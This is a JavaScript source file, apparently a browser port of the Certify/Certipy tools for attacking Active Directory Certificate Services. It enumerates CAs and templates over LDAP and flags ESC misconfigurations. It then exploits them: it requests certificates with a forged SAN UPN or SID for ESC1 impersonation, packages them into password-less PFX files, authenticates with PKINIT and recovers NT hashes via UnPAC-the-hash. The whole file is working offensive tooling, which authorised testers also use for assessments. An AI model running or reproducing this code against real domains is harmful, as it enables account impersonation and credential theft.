// Certify (browser port): AD CS enumeration + ESC misconfiguration discovery over
// LDAP, using the same hand-rolled LDAP/Kerberos/TLS stack as the other tools.
// Modes: find (everything), vulnerable (only findings), cas, templates.

import { LdapBhClient } from './ldap/source.js';
import { discoverConfigNC, enumerateCAs, enumerateTemplates, resolveSid, first } from './adcs/enum.js';
import { analyzeTemplate, templateEscs, analyzeCA, caEscs } from './adcs/esc.js';
import { wellKnownName, EKU_NAME } from './adcs/constants.js';
import { buildCsr, pem } from './adcs/pkcs10.js';
import { requestCertificate, extractLeafCert } from './adcs/icpr.js';
import { buildPfx } from './adcs/pkcs12.js';
import { b64ToBytes } from './security/sid.js';
import { getTgtPkinit } from './kerberos/pkinit.js';
import { unpacHash } from './kerberos/unpac.js';
import { KdcSocketTransport } from './kerberos/client.js';

const ekuName = (oid) => EKU_NAME[oid] || oid;

export async function run(config, hooks = {}) {
  const log = hooks.log || (() => {});

  const client = new LdapBhClient(log);
  await client.connect(config.host, config.port || (config.tls ? 636 : 389), {
    authMethod: config.authMethod || 'ntlm',
    bindDN: config.bindDN, user: config.user || config.bindDN,
    domain: config.domain, kdc: config.kdc, hash: config.hash,
    tls: config.tls, sni: config.host, password: config.password,
  });

  try {
    const configNC = config.configNC || await discoverConfigNC(client);
    if (!configNC) throw new Error('Could not determine the configuration naming context.');
    log(`Configuration NC: ${configNC}`);

    const caObjs = await enumerateCAs(client, configNC);
    const tplObjs = await enumerateTemplates(client, configNC);
    log(`Enumerated ${caObjs.length} CA(s) and ${tplObjs.length} certificate template(s).`);

    const cas = caObjs.map((o) => { const c = analyzeCA(o); return { ...c, escs: caEscs(c) }; });
    const templates = tplObjs.map((o) => { const t = analyzeTemplate(o); return { t, escs: templateEscs(t) }; });

    // A template is "enabled" when it's published (issued) by at least one CA.
    const published = new Set(cas.flatMap((c) => c.templates.map((x) => x.toLowerCase())));
    const isEnabled = (t) => published.has((t.name || '').toLowerCase());

    // Collect findings and resolve the principal SIDs to names for display.
    let findings = [];
    for (const c of cas) for (const e of c.escs) findings.push({ scope: 'CA', object: c.name, enabled: true, ...e });
    for (const { t, escs } of templates) for (const e of escs) findings.push({ scope: 'Template', object: t.display || t.name, enabled: isEnabled(t), ...e });
    for (const f of findings) {
      f.principalNames = [];
      for (const sid of f.principals || []) f.principalNames.push(`${await resolveSid(client, sid, wellKnownName)} (${sid})`);
    }
    log(`ESC analysis: ${findings.length} finding(s).`);

    // Shape rows for the UI / CLI.
    let templateRows = [];
    for (const { t, escs } of templates) {
      const enrollNames = [];
      for (const sid of t.acl.enroll) enrollNames.push(await resolveSid(client, sid, wellKnownName));
      templateRows.push({
        name: t.display || t.name, cn: t.name, enabled: isEnabled(t), schema: t.schema,
        clientAuth: t.clientAuth, suppliesSubject: t.suppliesSubject,
        managerApproval: t.managerApproval || t.requiresSignatures,
        ekus: t.ekus.map(ekuName), enrollees: enrollNames,
        escs: escs.map((e) => e.id),
      });
    }
    const caRows = cas.map((c) => ({ name: c.name, dns: c.dns, templates: c.templates.length, webEnroll: c.enrollmentServers.length > 0, escs: c.escs.map((e) => e.id) }));

    // `enabled` (Certipy -enabled): keep only published templates (CA findings stay).
    if (config.enabled) {
      templateRows = templateRows.filter((r) => r.enabled);
      findings = findings.filter((f) => f.scope === 'CA' || f.enabled);
    }

    return {
      mode: config.mode || 'find',
      summary: { CAs: cas.length, templates: config.enabled ? templateRows.length : templates.length, findings: findings.length },
      configNC, findings, templateRows, caRows,
    };
  } finally {
    await client.close();
    log('Connection closed.');
  }
}

// Request a certificate from a CA via MS-ICPR. config: { caHost, caName, template,
// subject, altUpn, altDns, user, domain, password }. altUpn/altDns drive the ESC1
// SubjectAltName. Returns { disposition, dispositionText, certPem, keyPem, … }.
export async function requestCert(config, hooks = {}) {
  const log = hooks.log || (() => {});
  const { csr, pkcs8 } = await buildCsr({
    subject: config.subject || 'CN=User',
    upns: config.altUpn ? [config.altUpn] : [],
    dnsNames: config.altDns ? [config.altDns] : [],
    sid: config.sid || null,
  });
  log(`Built PKCS#10 CSR — subject ${config.subject || 'CN=User'}${config.altUpn ? `, SAN otherName:UPN=${config.altUpn}` : ''}${config.sid ? `, szOID_NTDS_CA_SECURITY_EXT SID=${config.sid}` : ''}.`);
  const creds = { user: config.user || config.bindDN, domain: config.domain, password: config.password };
  const res = await requestCertificate(config.caHost, creds, { caName: config.caName, template: config.template, csr, log });
  log(`Disposition: ${res.dispositionText} (requestId ${res.requestId})${res.message ? ` — ${res.message}` : ''}`);
  let certPem = null;
  let pfx = null;
  if (res.disposition === 3 && res.cert && res.cert.length) {
    const leaf = extractLeafCert(res.cert);
    log(`Certificate issued: PKCS#7 ${res.cert.length}B, leaf ${leaf.length}B.`);
    certPem = pem('CERTIFICATE', leaf);
    // Bundle the leaf + private key into a password-less PFX so it imports
    // straight into Windows / .NET / certutil without extra conversion.
    pfx = await buildPfx(pkcs8, leaf);
    log(`PFX bundle: ${pfx.length}B (no password).`);
  }
  return { ...res, certPem, keyPem: pem('PRIVATE KEY', pkcs8), pfx };
}

const pemToDer = (p) => b64ToBytes(p.replace(/-----[^-]+-----|\s/g, ''));

// Extract the authenticating principal from an X.509 cert (DER): the SAN
// otherName UPN if present, otherwise the Subject's CN. Domain comes from the
// UPN suffix or, failing that, from the Issuer's DC= components.
//
// Certipy does the same auto-detect so `certipy auth -pfx …` doesn't need
// -u / -d — the cert already names its owner. Returns { username, domain }
// with either half possibly ''.
import { readTLV, children } from './ldap/ber.js';
const _dec = new TextDecoder();
// DER of OID 1.3.6.1.4.1.311.20.2.3 (szOID_KP_UPN — otherName UPN):
const UPN_OID_BYTES = Uint8Array.of(0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03);
// DER of OID 2.5.4.3 (CN):
const CN_OID_BYTES  = Uint8Array.of(0x06, 0x03, 0x55, 0x04, 0x03);
// DER of OID 0.9.2342.19200300.100.1.25 (dc):
const DC_OID_BYTES  = Uint8Array.of(0x06, 0x0a, 0x09, 0x92, 0x26, 0x89, 0x93, 0xf2, 0x2c, 0x64, 0x01, 0x19);

function bytesEqAt(buf, off, pat) {
  if (off + pat.length > buf.length) return false;
  for (let i = 0; i < pat.length; i++) if (buf[off + i] !== pat[i]) return false;
  return true;
}

export function parseCertIdentity(certDer) {
  const out = { username: '', domain: '' };
  const outer = readTLV(certDer, 0); if (!outer) return out;
  const tbs = readTLV(certDer, outer.valueStart); if (!tbs) return out;

  // Walk tbsCertificate children. The optional [0] version marker uses tag
  // 0xa0; everything else is a sequence. Collect the top-level SEQUENCE
  // children in order — that gives us serial, sigAlg, issuer, validity,
  // subject, spki, [issuerUID], [subjectUID], [3] extensions.
  const items = [];
  for (const t of children(certDer, tbs.valueStart, tbs.valueEnd)) items.push(t);

  // Locate subject and issuer by position (versioned or not).
  const offset = items[0] && items[0].tag === 0xa0 ? 1 : 0;
  const issuerTlv  = items[offset + 2];
  const subjectTlv = items[offset + 4];

  const cnFromName = (nameTlv) => {
    if (!nameTlv) return '';
    // Name → RDN SET → AttributeTypeAndValue SEQUENCE { OID, ANY }
    for (const rdn of children(certDer, nameTlv.valueStart, nameTlv.valueEnd)) {
      for (const atav of children(certDer, rdn.valueStart, rdn.valueEnd)) {
        if (bytesEqAt(certDer, atav.valueStart, CN_OID_BYTES)) {
          const valTlv = readTLV(certDer, atav.valueStart + CN_OID_BYTES.length);
          if (valTlv) return _dec.decode(certDer.subarray(valTlv.valueStart, valTlv.valueEnd));
        }
      }
    }
    return '';
  };
  const dcListFromName = (nameTlv) => {
    if (!nameTlv) return [];
    const parts = [];
    for (const rdn of children(certDer, nameTlv.valueStart, nameTlv.valueEnd)) {
      for (const atav of children(certDer, rdn.valueStart, rdn.valueEnd)) {
        if (bytesEqAt(certDer, atav.valueStart, DC_OID_BYTES)) {
          const valTlv = readTLV(certDer, atav.valueStart + DC_OID_BYTES.length);
          if (valTlv) parts.push(_dec.decode(certDer.subarray(valTlv.valueStart, valTlv.valueEnd)));
        }
      }
    }
    return parts;
  };

  // Try SAN otherName UPN first — that's the ESC1 target identity.
  let upn = '';
  const extsWrapper = items.find((t) => t.tag === 0xa3);
  if (extsWrapper) {
    const extsSeq = readTLV(certDer, extsWrapper.valueStart);
    if (extsSeq) {
      for (const ext of children(certDer, extsSeq.valueStart, extsSeq.valueEnd)) {
        // Extension { OID, critical BOOL OPTIONAL, extnValue OCTET STRING }
        // SAN OID is 2.5.29.17 → DER 06 03 55 1D 11
        if (!bytesEqAt(certDer, ext.valueStart, Uint8Array.of(0x06, 0x03, 0x55, 0x1d, 0x11))) continue;
        let p = ext.valueStart + 5;
        if (certDer[p] === 0x01) { const b = readTLV(certDer, p); p = b.next; }   // skip critical
        const oct = readTLV(certDer, p); if (!oct) continue;
        const gnSeq = readTLV(certDer, oct.valueStart); if (!gnSeq) continue;
        for (const gn of children(certDer, gnSeq.valueStart, gnSeq.valueEnd)) {
          if (gn.tag !== 0xa0) continue;                                          // otherName [0]
          if (!bytesEqAt(certDer, gn.valueStart, UPN_OID_BYTES)) continue;
          const inner = readTLV(certDer, gn.valueStart + UPN_OID_BYTES.length);   // [0] EXPLICIT
          if (!inner) continue;
          const upnStr = readTLV(certDer, inner.valueStart); if (!upnStr) continue;
          upn = _dec.decode(certDer.subarray(upnStr.valueStart, upnStr.valueEnd));
          break;
        }
      }
    }
  }
  if (upn) {
    const at = upn.indexOf('@');
    if (at > 0) { out.username = upn.slice(0, at); out.domain = upn.slice(at + 1); }
    else out.username = upn;
  }
  if (!out.username) out.username = cnFromName(subjectTlv);
  if (!out.domain) {
    // AD writes the DN with root-most DC first in the SEQUENCE
    // (…CN=x, DC=lab, DC=pk); joining root-last gives the FQDN.
    const dc = dcListFromName(subjectTlv);
    const dcs = dc.length ? dc : dcListFromName(issuerTlv);
    out.domain = dcs.slice().reverse().join('.');
  }
  return out;
}

// certipy auth: authenticate to the KDC with a certificate (PKINIT) to get a TGT,
// and (unpac) recover the account's NT hash via UnPAC-the-hash. config supplies a
// { certPem, keyPem } pair, or the parameters to request one first.
export async function authenticate(config, hooks = {}) {
  const log = hooks.log || (() => {});
  let { certPem, keyPem } = config;
  if (!certPem) {
    const req = await requestCert(config, { log });
    if (!req.certPem) throw new Error(`certificate request failed: ${req.dispositionText}`);
    certPem = req.certPem; keyPem = req.keyPem;
  }
  const certDer = pemToDer(certPem);
  const privateKey = await globalThis.crypto.subtle.importKey('pkcs8', pemToDer(keyPem), { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' }, false, ['sign']);
  const transport = new KdcSocketTransport(config.kdc || config.host, 88, log);
  await transport.connect();
  try {
    const tgt = await getTgtPkinit(transport, { username: config.user, realm: config.domain, certDer, privateKey, log });
    let ntHash = null;
    if (config.unpac !== false) ntHash = (await unpacHash(transport, tgt, log)).ntHash;
    return {
      ok: true, username: config.user, realm: config.domain,
      sessionKeyEtype: tgt.sessionKey.etype,
      sessionKey: tgt.sessionKey.key,   // raw session-key bytes (for ccache export)
      ticket: tgt.ticket,               // raw [APPLICATION 1] Ticket DER
      ntHash, certPem, keyPem,
    };
  } finally {
    await transport.close();
  }
}
